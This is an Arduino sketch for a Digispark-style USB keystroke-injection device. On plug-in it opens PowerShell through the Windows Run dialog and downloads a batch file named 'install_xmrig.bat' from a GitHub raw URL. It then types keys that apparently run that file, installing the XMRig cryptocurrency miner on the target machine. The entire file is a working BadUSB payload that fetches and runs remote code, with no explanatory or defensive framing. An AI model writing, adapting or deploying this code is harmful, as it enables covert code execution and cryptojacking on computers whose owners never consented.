#include "DigiKeyboardPtBr.h"
void setup() {
  DigiKeyboardPtBr.sendKeyStroke(0);
  DigiKeyboardPtBr.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("powershell");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.print("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/kazz920/eden/refs/heads/main/install_xmrig.bat' -OutFile 'install_xmrig.bat'");
  DigiKeyboardPtBr.delay(1000);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
  DigiKeyboardPtBr.delay(5000);
  DigiKeyboardPtBr.print("install");
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(0x2b);
  DigiKeyboardPtBr.delay(500);
  DigiKeyboardPtBr.sendKeyStroke(KEY_ENTER);
}

void loop() {

}